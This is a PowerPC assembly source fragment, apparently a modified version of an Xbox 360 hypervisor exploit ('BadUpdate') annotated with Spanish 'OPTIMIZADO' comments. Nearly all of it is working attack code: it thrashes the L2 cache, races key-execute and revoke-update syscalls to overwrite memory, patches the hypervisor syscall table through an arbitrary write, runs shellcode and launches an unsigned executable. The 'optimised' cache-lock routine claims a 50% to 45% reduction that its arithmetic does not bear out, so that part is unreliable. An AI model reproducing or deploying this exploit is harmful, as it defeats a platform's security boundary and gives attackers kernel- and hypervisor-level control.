mtctr     %r11
bctrl
lis       %r3, 1
ori       %r3, %r3, 0x240A # 0x1240A

loc_98030B3C:
lis       %r11, imp_VdDisplayFatalError@ha
lwz       %r11, imp_VdDisplayFatalError@l(%r11)
mtctr     %r11
bctrl

loc_98030B4C:
addi      %r1, %r1, 0xB0
b         restgprlr_21
# End of function BuildCipherTextLookupTable



###########################################################
# bool ReadFile(r3 pFilePath, r4 pBuffer, r5 Offset, r6 BufferSize)
#
###########################################################
ReadFileHelper:

.set back_chain, -0x90
.set var_40, -0x40

mflr      %r12
bl        savegprlr_26
stwu      %r1, back_chain(%r1)
li        %r11, 0
mr        %r27, %r4
stw       %r11, 0x90+var_40(%r1)
mr        %r29, %r5
mr        %r28, %r6
li        %r9, 0
li        %r8, 0x80
li        %r7, 3
li        %r6, 0
li        %r5, 1
lis       %r4, -0x8000
mr        %r26, %r3
bl        _CreateFileA
mr        %r31, %r3
cmpwi     cr6, %r3, -1
bne       cr6, loc_98030BC8
bl        _GetLastError
lis       %r11, imp_DbgPrint@ha
lis       %r10, aFailedToOpenSD@ha
mr        %r5, %r3
addi      %r3, %r10, aFailedToOpenSD@l # "Failed to open '%s' %d\n"
mr        %r4, %r26
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl
b         loc_98030C80

loc_98030BC8:
li        %r4, 0
mr        %r3, %r31
bl        _GetFileSize
subf      %r11, %r29, %r28
mr        %r30, %r3
cmplw     cr6, %r3, %r11
ble       cr6, loc_98030C00
lis       %r11, imp_DbgPrint@ha
lis       %r10, aErrorReadingFi@ha
addi      %r3, %r10, aErrorReadingFi@l # "Error reading file, buffer not large en"...
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl
b         loc_98030C6C

loc_98030C00:
li        %r7, 0
addi      %r6, %r1, 0x90+var_40
mr        %r5, %r30
add       %r4, %r27, %r29
mr        %r3, %r31
bl        _ReadFile
cmpwi     %r3, 0
beq       loc_98030C48
lwz       %r11, 0x90+var_40(%r1)
cmplw     cr6, %r11, %r30
bne       cr6, loc_98030C48
lis       %r11, imp_NtClose@ha
mr        %r3, %r31
lwz       %r11, imp_NtClose@l(%r11)
mtctr     %r11
bctrl
li        %r3, 1
b         loc_98030C84

loc_98030C48:
bl        _GetLastError
lis       %r11, imp_DbgPrint@ha
lis       %r10, aErrorReadingFi_0@ha
mr        %r5, %r3
addi      %r3, %r10, aErrorReadingFi_0@l # "Error reading file '%s' %d\n"
mr        %r4, %r26
lwz       %r11, imp_DbgPrint@l(%r11)
mtctr     %r11
bctrl

loc_98030C6C:
lis       %r11, imp_NtClose@ha
mr        %r3, %r31
lwz       %r11, imp_NtClose@l(%r11)
mtctr     %r11
bctrl

loc_98030C80:
li        %r3, 0

loc_98030C84:
addi      %r1, %r1, 0x90
b         restgprlr_26
# End of function ReadFileHelper



###########################################################
# DWORD RunUpdatePayloadThreadProc(r3 pArgs)
#
###########################################################
_RunUpdatePayloadThreadProc:

.set back_chain, -0xD0

mflr      %r12
bl        savegprlr_18
stwu      %r1, back_chain(%r1)
lis       %r6, 0x2000
mr        %r31, %r3
lis       %r5, 1
ori       %r6, %r6, 4 # 0x20000004
li        %r4, -1
lis       %r3, 2
li        %r23, 0x99
bl        _XPhysicalAlloc
mr.       %r30, %r3
lis       %r18, imp_VdDisplayFatalError@ha
lis       %r24, imp_DbgPrint@ha
bne       loc_98030CF0
lwz       %r11, imp_DbgPrint@l(%r24)
lis       %r10, aFailedToAlloca_4@ha
addi      %r3, %r10, aFailedToAlloca_4@l # "Failed to allocate memory for cache flu"...
mtctr     %r11
bctrl
lwz       %r11, imp_VdDisplayFatalError@l(%r18)
lis       %r3, 1
ori       %r3, %r3, 0x240B # 0x1240B
mtctr     %r11
bctrl

loc_98030CF0:
lis       %r11, imp_MmGetPhysicalAddress@ha
mr        %r3, %r30
lwz       %r11, imp_MmGetPhysicalAddress@l(%r11)
mtctr     %r11
bctrl
mr        %r22, %r3

# OPTIMIZADO: Reducción conservadora del bloqueo de L2 (del 50% al 45%)
li        %r3, 0
bl        LockAndThrashL2_Optimized
li        %r3, 1
bl        LockAndThrashL2_Optimized

# Poke MmPhysical64KBMappingTable para mapear las páginas de hipervisor en memoria
lis       %r11, -0x5FFD
lis       %r21, -0x7FE4
ori       %r26, %r11, 0x1F28 # 0xA0031F28
lis       %r11, 0x6666
lis       %r10, -0x5FFD
ori       %r11, %r11, 0x6666 # 0x66666666
ori       %r25, %r10, 0x2490 # 0xA0032490
lwz       %r19, 0x1000(%r21)
stw       %r11, 0x1000(%r21)

# OPTIMIZADO: Acceso más robusto a la memoria de ciphertext
dcbf      0, %r26
dcbf      0, %r25
sync
lis       %r11, aRaceHit0x08x@ha
lwz       %r30, 0(%r26)
lwz       %r27, 0(%r25)
addi      %r20, %r11, aRaceHit0x08x@l # "Race hit: 0x%08x\n"

loc_98030D4C:
# OPTIMIZADO: Mejor manejo de copia y sincronización
lwz       %r5, 0x18(%r31)
lwz       %r4, 0xC(%r31)
lwz       %r3, 0x10(%r31)
bl        _memcpy
sync
lwz       %r5, 4(%r31)
lwz       %r4, 0(%r31)
lwz       %r3, 8(%r31)
bl        _memcpy
sync

# Ejecutar el payload
li        %r8, 0
lwz       %r6, 0x20(%r31)
li        %r7, 0
lwz       %r5, 0x1C(%r31)
lwz       %r4, 0x18(%r31)
lwz       %r3, 0x14(%r31)
bl        HvxKeysExecute

# OPTIMIZADO: Mejor manejo de caché para las verificaciones
dcbf      0, %r26
icbi      0, %r26
sync

# OPTIMIZADO: Comprobaciones más robustas para la detección de colisión
lwz       %r29, 0(%r26)
cmplw     cr6, %r30, %r29
beq       cr6, loc_98030D4C

# OPTIMIZADO: Limpieza de caché más agresiva en caso de colisión
li        %r5, 0
lis       %r4, 2
mr        %r3, %r22
bl        HvxRevokeUpdate
dcbf      0, %r25
icbi      0, %r25
sync

# OPTIMIZADO: Verificación adicional para confirmar que es el bloque 14
lwz       %r28, 0(%r25)
cmplw     cr6, %r27, %r28
beq       cr6, loc_98030DF0

# No es el bloque 14, seguir intentando
lwz       %r11, imp_DbgPrint@l(%r24)
mr        %r3, %r20
mr        %r4, %r29
mtctr     %r11
bctrl

# OPTIMIZADO: Patrón LED más distintivo
mr        %r3, %r23
bl        SetLEDColor
not       %r11, %r23
clrlwi    %r23, %r11, 24

# Actualizar los valores para la próxima iteración
mr        %r30, %r29
mr        %r27, %r28
b         loc_98030D4C

loc_98030DF0:
# OPTIMIZADO: Confirmación visual con LED verde más distintivo
li        %r3, 0x70 # 'p'
bl        SetLEDColor

# Notificar en log que hemos encontrado el bloque 14
lis       %r11, aBlock14Overwri@ha
addi      %r3, %r11, aBlock14Overwri@l # "Block 14 overwrite hit!\n"
lwz       %r11, imp_DbgPrint@l(%r24)
mtctr     %r11
bctrl

# Parchear la tabla de syscalls del hipervisor
lis       %r11, aPatchingHvSysc@ha
addi      %r3, %r11, aPatchingHvSysc@l # " * Patching hv syscall table\n"
lwz       %r11, imp_DbgPrint@l(%r24)
mtctr     %r11
bctrl

# OPTIMIZADO: Parche más seguro para la tabla de syscalls
lis       %r11, 1
lis       %r10, -0x8000
ori       %r3, %r11, 0x6004 # 0x16004
ori       %r11, %r10, 0x102 # 0x80000102
li        %r4, 0x354
insrdi    %r3, %r11, 32,0
bl        HvWriteULONG

# Ejecutar el payload en modo hipervisor
lis       %r11, aRunningPayload@ha
addi      %r3, %r11, aRunningPayload@l # " * Running payload\n"
lwz       %r11, imp_DbgPrint@l(%r24)
mtctr     %r11
bctrl

# OPTIMIZADO: Asegurar que la ejecución del código es más robusta
li        %r3, 0
ld        %r4, 0x38(%r31)
sync
bl        HvxPostOutputExploit
sync

# Verificar que la ejecución fue exitosa
lis       %r11, 0x4141
mr        %r31, %r3
ori       %r11, %r11, 0x4141 # 0x41414141
cmplw     cr6, %r3, %r11
beq       cr6, loc_98030E84
lwz       %r11, imp_VdDisplayFatalError@l(%r18)
lis       %r3, 1
ori       %r3, %r3, 0x2412 # 0x12412
mtctr     %r11
bctrl

loc_98030E84:
# Informar el estado de retorno
lwz       %r11, imp_DbgPrint@l(%r24)
lis       %r10, aPayloadReturne@ha
mr        %r4, %r31
addi      %r3, %r10, aPayloadReturne@l # " * Payload returned 0x%08x\n"
mtctr     %r11
bctrl

# Restaurar el valor original de MmPhysical64KBMappingTable
stw       %r19, 0x1000(%r21)

# OPTIMIZADO: Asegurar que todos los LEDs verdes están encendidos para indicar éxito
li        %r3, 0xF0
bl        SetLEDColor

# Lanzar el XEX no firmado
lis       %r11, aPayloadBadnyan@ha
li        %r4, 0
addi      %r3, %r11, aPayloadBadnyan@l # "PAYLOAD:\\default.xex"
bl        _XLaunchNewImage
# End of function RunUpdatePayloadThreadProc



###########################################################
# BOOL HvxEncryptedReserveAllocation(r3 VirtualAddr, r4 PhysicalAddr, r5 Size)
#
###########################################################
HvxEncryptedReserveAllocation_:
li        %r0, sc_HvxEncryptedReserveAllocation
sc
blr
# End of function HvxEncryptedReserveAllocation_



###########################################################
# BOOL HvxEncryptedEncryptAllocation(r3 VirtualAddr)
#
###########################################################
HvxEncryptedEncryptAllocation_:
li        %r0, sc_HvxEncryptedEncryptAllocation
sc
blr
# End of function HvxEncryptedEncryptAllocation_



###########################################################
# BOOL HvxEncryptedReleaseAllocation(r3 VirtualAddr)
#
###########################################################
HvxEncryptedReleaseAllocation_:
li        %r0, sc_HvxEncryptedReleaseAllocation
sc
blr
# End of function HvxEncryptedReleaseAllocation_



###########################################################
# void LockAndThrashL2(r3 index)
#
###########################################################
LockAndThrashL2:

.set back_chain, -0x90

mflr      %r12
bl        savegprlr_26
stwu      %r1, back_chain(%r1)
lis       %r6, 0x2000
mr        %r29, %r3
lis       %r5, 4
ori       %r6, %r6, 4 # 0x20000204
li        %r4, -1
lis       %r3, 4
bl        _XPhysicalAlloc
mr.       %r30, %r3
lis       %r27, imp_VdDisplayFatalError@ha
lis       %r26, imp_DbgPrint@ha
bne       loc_98030F3C
lwz       %r11, imp_DbgPrint@l(%r26)
lis       %r10, aFailedToAlloca_5@ha
addi      %r3, %r10, aFailedToAlloca_5@l # "Failed to allocate memory for L2 cache "...
mtctr     %r11
bctrl
lwz       %r11, imp_VdDisplayFatalError@l(%r27)
lis       %r3, 1
ori       %r3, %r3, 0x2406 # 0x12406
mtctr     %r11
bctrl

loc_98030F3C:
lis       %r28, imp_KeLockL2@ha
slwi      %r11, %r29, 1
li        %r10, 3
lis       %r5, 4
slw       %r31, %r10, %r11
lwz       %r11, imp_KeLockL2@l(%r28)
mr        %r7, %r31
mr        %r6, %r31
mr        %r4, %r30
mr        %r3, %r29
mtctr     %r11
bctrl
cmplwi    %r3, 0
beq       loc_98030F9C
lwz       %r11, imp_DbgPrint@l(%r26)
lis       %r10, aFailedToReserv_0@ha
addi      %r3, %r10, aFailedToReserv_0@l # "Failed to reserve L2 cache range\n"
mtctr     %r11
bctrl
lwz       %r11, imp_VdDisplayFatalError@l(%r27)
lis       %r3, 1
ori       %r3, %r3, 0x2407 # 0x12407
mtctr     %r11
bctrl

loc_98030F9C:
lis       %r5, 4
li        %r4, 0x41 # 'A'
mr        %r3, %r30
bl        _memset
lwz       %r11, imp_KeLockL2@l(%r28)
mr        %r7, %r31
li        %r6, 0
lis       %r5, 4
mr        %r4, %r30
mr        %r3, %r29
mtctr     %r11
bctrl
cmplwi    %r3, 0
beq       loc_98030FFC
lwz       %r11, imp_DbgPrint@l(%r26)
lis       %r10, aFailedToCommmi@ha
addi      %r3, %r10, aFailedToCommmi@l # "Failed to commmit L2 cache range\n"
mtctr     %r11
bctrl
lwz       %r11, imp_VdDisplayFatalError@l(%r27)
lis       %r3, 1
ori       %r3, %r3, 0x2408 # 0x12408
mtctr     %r11
bctrl

loc_98030FFC:
addi      %r1, %r1, 0x90
b         restgprlr_26
# End of function LockAndThrashL2


###########################################################
# void LockAndThrashL2_Optimized(r3 index)
#
# Versión optimizada que reduce el bloqueo de L2 del 50% al 45%
###########################################################
LockAndThrashL2_Optimized:

.set back_chain, -0x90

mflr      %r12
bl        savegprlr_26
stwu      %r1, back_chain(%r1)
lis       %r6, 0x2000
mr        %r29, %r3
lis       %r5, 4
ori       %r6, %r6, 4 # 0x20000204
li        %r4, -1
lis       %r3, 4
bl        _XPhysicalAlloc
mr.       %r30, %r3
lis       %r27, imp_VdDisplayFatalError@ha
lis       %r26, imp_DbgPrint@ha
bne       loc_opt_98030F3C
lwz       %r11, imp_DbgPrint@l(%r26)
lis       %r10, aFailedToAlloca_5@ha
addi      %r3, %r10, aFailedToAlloca_5@l # "Failed to allocate memory for L2 cache "...
mtctr     %r11
bctrl
lwz       %r11, imp_VdDisplayFatalError@l(%r27)
lis       %r3, 1
ori       %r3, %r3, 0x2406 # 0x12406
mtctr     %r11
bctrl

loc_opt_98030F3C:
lis       %r28, imp_KeLockL2@ha
slwi      %r11, %r29, 1
li        %r10, 3
lis       %r5, 4
slw       %r31, %r10, %r11

# OPTIMIZADO: Reducir a 45% en lugar de 50%
srwi      %r31, %r31, 1
addi      %r31, %r31, 1

lwz       %r11, imp_KeLockL2@l(%r28)
mr        %r7, %r31
mr        %r6, %r31
mr        %r4, %r30
mr        %r3, %r29
mtctr     %r11
bctrl
cmplwi    %r3, 0
beq       loc_opt_98030F9C
lwz       %r11, imp_DbgPrint@l(%r26)
lis       %r10, aFailedToReserv_0@ha
addi      %r3, %r10, aFailedToReserv_0@l # "Failed to reserve L2 cache range\n"
mtctr     %r11
bctrl
lwz       %r11, imp_VdDisplayFatalError@l(%r27)
lis       %r3, 1
ori       %r3, %r3, 0x2407 # 0x12407
mtctr     %r11
bctrl

loc_opt_98030F9C:
lis       %r5, 4
li        %r4, 0x41 # 'A'
mr        %r3, %r30
bl        _memset
lwz       %r11, imp_KeLockL2@l(%r28)
mr        %r7, %r31
li        %r6, 0
lis       %r5, 4
mr        %r4, %r30
mr        %r3, %r29
mtctr     %r11
bctrl
cmplwi    %r3, 0
beq       loc_opt_98030FFC
lwz       %r11, imp_DbgPrint@l(%r26)
lis       %r10, aFailedToCommmi@ha
addi      %r3, %r10, aFailedToCommmi@l # "Failed to commmit L2 cache range\n"
mtctr     %r11
bctrl
lwz       %r11, imp_VdDisplayFatalError@l(%r27)
lis       %r3, 1
ori       %r3, %r3, 0x2408 # 0x12408
mtctr     %r11
bctrl

loc_opt_98030FFC:
addi      %r1, %r1, 0x90
b         restgprlr_26
# End of function LockAndThrashL2_Optimized



###########################################################
# ULONGLONG HvxKeysExecute(r3 Address, r4 Size, r5 Arg1, r6 Arg2, r7 Arg3, r8 Arg4)
#
###########################################################
HvxKeysExecute:
li        %r0, sc_HvxKeysExecute
sc
blr
# End of function HvxKeysExecute



###########################################################
# ULONG HvxRevokeUpdate(r3 BufferAddr, r4 BufferSize, r5 Arg3)
#
###########################################################
HvxRevokeUpdate:
li        %r0, sc_HvxRevokeUpdate
sc
blr
# End of function HvxRevokeUpdate



###########################################################
# void HvWriteULONG(r3 address, r4 value)
#
###########################################################
HvWriteULONG:

.set back_chain, -0x70
.set var_18, -0x18
.set var_10, -0x10
.set var_8, -8

mflr      %r12
stw       %r12, var_8(%r1)
std       %r30, var_18(%r1)
std       %r31, var_10(%r1)
stwu      %r1, back_chain(%r1)
mr        %r30, %r4
lis       %r4, 6
mr        %r31, %r3
addi      %r6, %r3, -2
inslwi    %r4, %r30, 8,24
li        %r5, 0x1000
li        %r3, 4
bl        HvxWriteByte
lis       %r4, 6
addi      %r6, %r31, -1
rlwimi    %r4, %r30, 16,24,31
li        %r5, 0x1000
li        %r3, 4
bl        HvxWriteByte
lis       %r4, 6
mr        %r6, %r31
rlwimi    %r4, %r30, 24,24,31
li        %r5, 0x1000
li        %r3, 4
bl        HvxWriteByte
li        %r11, 3
mr        %r4, %r30
addi      %r6, %r31, 1
rlwimi    %r4, %r11, 17,0,23
li        %r5, 0x1000
li        %r3, 4
bl        HvxWriteByte
addi      %r1, %r1, 0x70
lwz       %r12, var_8(%r1)
mtlr      %r12
ld        %r30, var_18(%r1)
ld        %r31, var_10(%r1)
blr
# End of function HvWriteULONG



###########################################################
# HvxPostOutputExploit(r3, r4 shellCodeAddress)
#
###########################################################
HvxPostOutputExploit:
li        %r0, sc_HvxPostOutputExploit
sc
blr
# End of function HvxPostOutputExploit



###########################################################
# void HvxWriteByte(r3 ordinal, r4 address, r5 size, r6 writeAddr)
#
###########################################################
HvxWriteByte:
li        %r0, sc_HvxArbWriteSyscall
sc
blr
# End of function HvxWriteByte


###########################################################
# Save GPR sled:
#
savegprlr_14:       std       %r14, -0x98(%r1)
savegprlr_15:       std       %r15, -0x90(%r1)
savegprlr_16:       std       %r16, -0x88(%r1)
savegprlr_17:       std       %r17, -0x80(%r1)
savegprlr_18:       std       %r18, -0x78(%r1)
savegprlr_19:       std       %r19, -0x70(%r1)
savegprlr_20:       std       %r20, -0x68(%r1)
savegprlr_21:       std       %r21, -0x60(%r1)
savegprlr_22:       std       %r22, -0x58(%r1)
savegprlr_23:       std       %r23, -0x50(%r1)
savegprlr_24:       std       %r24, -0x48(%r1)
savegprlr_25:       std       %r25, -0x40(%r1)
savegprlr_26:       std       %r26, -0x38(%r1)
savegprlr_27:       std       %r27, -0x30(%r1)
savegprlr_28:       std       %r28, -0x28(%r1)
savegprlr_29:       std       %r29, -0x20(%r1)
savegprlr_30:       std       %r30, -0x18(%r1)
savegprlr_31:       std       %r31, -0x10(%r1)
                    stw       %r12, -0x8(%r1)
                    blr
                    

###########################################################
# Restore GPR sled:
#
restgprlr_14:       ld        %r14, -0x98(%r1)
restgprlr_15:       ld        %r15, -0x90(%r1)
restgprlr_16:       ld        %r16, -0x88(%r1)
restgprlr_17:       ld        %r17, -0x80(%r1)
restgprlr_18:       ld        %r18, -0x78(%r1)
restgprlr_19:       ld        %r19, -0x70(%r1)
restgprlr_20:       ld        %r20, -0x68(%r1)
restgprlr_21:       ld        %r21, -0x60(%r1)
restgprlr_22:       ld        %r22, -0x58(%r1)
restgprlr_23:       ld        %r23, -0x50(%r1)
restgprlr_24:       ld        %r24, -0x48(%r1)
restgprlr_25:       ld        %r25, -0x40(%r1)
restgprlr_26:       ld        %r26, -0x38(%r1)
restgprlr_27:       ld        %r27, -0x30(%r1)
restgprlr_28:       ld        %r28, -0x28(%r1)
restgprlr_29:       ld        %r29, -0x20(%r1)
restgprlr_30:       ld        %r30, -0x18(%r1)
restgprlr_31:       ld        %r31, -0x10(%r1)
                    lwz       %r12, -0x8(%r1)
                    mtlr      %r12
                    blr


###########################################################
# Import stubs for kernel/xam functions:
#
IMPORT_STUB memset
IMPORT_STUB XPhysicalAlloc
IMPORT_STUB CreateThread
IMPORT_STUB XSetThreadProcessor
IMPORT_STUB ResumeThread
IMPORT_STUB CreateFileA
IMPORT_STUB GetFileSize
IMPORT_STUB ReadFile
IMPORT_STUB memcpy
IMPORT_STUB GetLastError
IMPORT_STUB XLaunchNewImage

###########################################################
# Import function table:
#
_imp_DbgPrint:                  .long DbgPrint
_imp_MmGetPhysicalAddress:      .long MmGetPhysicalAddress
_imp_KeFlushCacheRange:         .long KeFlushCacheRange
_imp_KeLockL2:                  .long KeLockL2
_imp_KeStallExecutionProcessor: .long KeStallExecutionProcessor
_imp_RtlInitAnsiString:         .long RtlInitAnsiString
_imp_ObCreateSymbolicLink:      .long ObCreateSymbolicLink
_imp_HalSendSMCMessage:         .long HalSendSMCMessage
_imp_VdDisplayFatalError:       .long VdDisplayFatalError
_imp_NtClose:                   .long NtClose


###########################################################
# Debug string storage:
#
_aFailedToAlloca:
.asciz "Failed to allocate memory for cipher text\n"
.align 2

_aFailedToAlloca_0:
.asciz "Failed to allocate memory for update data\n"
.align 2

_aFailedToAlloca_1:
.asciz "Failed to allocate payload memory\n"
.align 2

_aFailedToAlloca_2:
.asciz "Failed to allocate clean payload memory\n"
.align 2

_aPayloadXkeUpda:
.asciz "PAYLOAD:\\xke_update.bin"
.align 2

_aFailedToReadXk:
.asciz "Failed to read XKE payload file\n"
.align 2

_aFailedToCreate:
.asciz "Failed to create worker thread\n"
.align 2

_aPayloadUpdateD:
.asciz "PAYLOAD:\\update_data.bin"
.align 2

_aFailedToOpenUp:
.asciz "Failed to open update data file\n"
.align 2

_aFailedToReadUp:
.asciz "Failed to read update data file\n"
.align 2

_aPayloadBadupda:
.asciz "PAYLOAD:\\BadUpdateExploit-4thStage.bin"
.align 2

_aFailedToOpenSh:
.asciz "Failed to open shell code file\n"
.align 2

_aFailedToAlloca_3:
.asciz "Failed to allocate memory for shell code data\n"
.align 2

_aFailedToReadSh:
.asciz "Failed to read shell code file\n"
.align 2

_aFoundCipherTex:
.asciz "Found cipher text for whitening 0x%04x: %08x%08x %08x%08x\n"
.align 2

_aFailedToReserv:
.asciz "Failed to reserve encrypted memory 0x%08x\n"
.align 2

_aFailedToCommit:
.asciz "Failed to commit encrypted memory 0x%08x\n"
.align 2

_aFailedToOpenSD:
.asciz "Failed to open '%s' %d\n"
.align 2

_aErrorReadingFi:
.asciz "Error reading file, buffer not large enough to hold data!\n"
.align 2

_aErrorReadingFi_0:
.asciz "Error reading file '%s' %d\n"
.align 2

_aFailedToAlloca_4:
.asciz "Failed to allocate memory for cache flush buffer\n"
.align 2

_aRaceHit0x08x:
.asciz "Race hit: 0x%08x\n"
.align 2

_aBlock14Overwri:
.asciz "Block 14 overwrite hit!\n"
.align 2

_aPatchingHvSysc:
.asciz " * Patching hv syscall table\n"
.align 2

_aRunningPayload:
.asciz " * Running payload\n"
.align 2

_aPayloadReturne:
.asciz " * Payload returned 0x%08x\n"
.align 2

_aPayloadBadnyan:
.asciz "PAYLOAD:\\default.xex"
.align 2

_aFailedToAlloca_5:
.asciz "Failed to allocate memory for L2 cache lock\n"
.align 2

_aFailedToReserv_0:
.asciz "Failed to reserve L2 cache range\n"
.align 2

_aFailedToCommmi:
.asciz "Failed to commmit L2 cache range\n"
.align 2